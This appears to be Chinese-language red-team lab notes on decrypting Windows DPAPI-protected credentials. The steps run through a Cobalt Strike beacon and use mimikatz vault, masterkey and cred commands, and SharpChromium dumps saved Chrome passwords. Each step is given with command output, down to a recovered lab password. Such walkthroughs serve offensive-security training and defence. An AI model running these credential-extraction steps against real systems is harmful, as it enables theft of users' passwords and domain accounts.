# Data Protection API

Data Protection API是windows里面的一个组件，被windows管理器用来加解密各种用户凭据，比如RDP等。

谷歌浏览器也会用DPAPI保存网站的用户凭据。

# Credential Manager
credential manager blobs存储在```AppData```目錄

```
 beacon> ls C:\Users\bfarmer\AppData\Local\Microsoft\Credentials

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
 372b     fil     02/25/2021 13:07:38   9D54C839752B38B233E5D56FDD7891A7
 10kb     fil     02/21/2021 11:49:40   DFBE70A7E5CC19A398EBF1B96859CE5D
```


 使用windows自带的vaultcmd命令可以列出
```
 beacon> run vaultcmd /listcreds:"Windows Credentials" /all
```

 或者mimikatz
```
 beacon> mimikatz vault::list
```
要解密凭据，需要找到```master encryption key```

执行```dpapi::cred```,指定要解密的凭据路径
```
 beacon> mimikatz dpapi::cred /in:C:\Users\bfarmer\AppData\Local\Microsoft\Credentials\9D54C839752B38B233E5D56FDD7891A7

BLOB
  dwVersion          : 00000001 - 1
  guidProvider       : {df9d8cd0-1501-11d1-8c7a-00c04fc297eb}
  dwMasterKeyVersion : 00000001 - 1
  guidMasterKey      : {a23a1631-e2ca-4805-9f2f-fe8966fd8698}
  dwFlags            : 20000000 - 536870912 (system ; )
  dwDescriptionLen   : 00000030 - 48
  szDescription      : Local Credential Data

  algCrypt           : 00006603 - 26115 (CALG_3DES)
  dwAlgCryptLen      : 000000c0 - 192
  dwSaltLen          : 00000010 - 16
  pbSalt             : f8fb8d0f5df3f976e445134a2410ffcd
  dwHmacKeyLen       : 00000000 - 0
  pbHmackKey         : 
  algHash            : 00008004 - 32772 (CALG_SHA1)
  dwAlgHashLen       : 000000a0 - 160
  dwHmac2KeyLen      : 00000010 - 16
  pbHmack2Key        : e8ae77b9f12aef047664529148beffcc
  dwDataLen          : 000000b0 - 176
  pbData             : b8f619[...snip...]b493fe
  dwSignLen          : 00000014 - 20
  pbSign             : 2e12c7baddfa120e1982789f7265f9bb94208985
```

guidMasterKey包含解密所需密钥的 GUID，上面是：```a23a1631-e2ca-4805-9f2f-fe8966fd8698```

```pbData```就是我们要解密的内容

也可以在这个目录```AppData\Roaming\Microsoft\Protect```上找到GUID
> The Master Key information is stored within the user's AppData\Roaming\Microsoft\Protect directory (where S-1-5-21-* is their SID).

```
 beacon> ls C:\Users\bfarmer\AppData\Roaming\Microsoft\Protect\S-1-5-21-3263068140-2042698922-2891547269-1120

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
 740b     fil     02/21/2021 11:49:40   a23a1631-e2ca-4805-9f2f-fe8966fd8698
 928b     fil     02/21/2021 11:49:40   BK-DEV
 24b      fil     02/21/2021 11:49:40   Preferred
```



知道了GUID，利用mimikatz获取masterkey，需要system或管理员权限
```
 beacon> mimikatz dpapi::masterkey /in:C:\Users\bfarmer\AppData\Roaming\Microsoft\Protect\S-1-5-21-3263068140-2042698922-2891547269-1120\a23a1631-e2ca-4805-9f2f-fe8966fd8698 /rpc

[domainkey] with RPC
[DC] 'dev.cyberbotic.io' will be the domain
[DC] 'dc-2.dev.cyberbotic.io' will be the DC server
  key : 0c0105785f89063857239915037fbbf0ee049d984a09a7ae34f7cfc31ae4e6fd029e6036cde245329c635a6839884542ec97bf640242889f61d80b7851aba8df
  sha1: e3d7a52f1755a35078736eecb5ea6a23bb8619fc
```

上面的key就是解密需要的masterkey

解密凭据，得到明文密码：```Sup3rman```
```
beacon> mimikatz dpapi::cred /in:C:\Users\bfarmer\AppData\Local\Microsoft\Credentials\9D54C839752B38B233E5D56FDD7891A7 /masterkey:0c0105785f89063857239915037fbbf0ee049d984a09a7ae34f7cfc31ae4e6fd029e6036cde245329c635a6839884542ec97bf640242889f61d80b7851aba8df

Decrypting Credential:
 [...snip...]
  UserName       : DEV\bfarmer
  CredentialBlob : Sup3rman
```

在上面的例子中，bfarmer是SRV-1的本地管理员，所以他们只是保存了自己的域凭证。值得注意的是，即使他们有本地凭证，甚至保存了一套不同的域凭证，解密的过程也是完全一样的。


# Google Chrome

Chrome的用户凭据也是存放在```AppData```目录
```
beacon> ls C:\Users\bfarmer\AppData\Local\Google\Chrome\User Data\Default

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
 40kb     fil     02/25/2021 13:21:18   Login Data
```

可以使用[SharpChromium](https://github.com/djhohnstein/SharpChromium)破解里面的密码

```
beacon> execute-assembly C:\Tools\SharpChromium\bin\Debug\SharpChromium.exe logins

[*] Beginning Google Chrome extraction.

--- Chromium Credential (User: bfarmer) ---
URL      : 
Username : bfarmer
Password : Sup3rman

[*] Finished Google Chrome extraction.
[*] Done.
```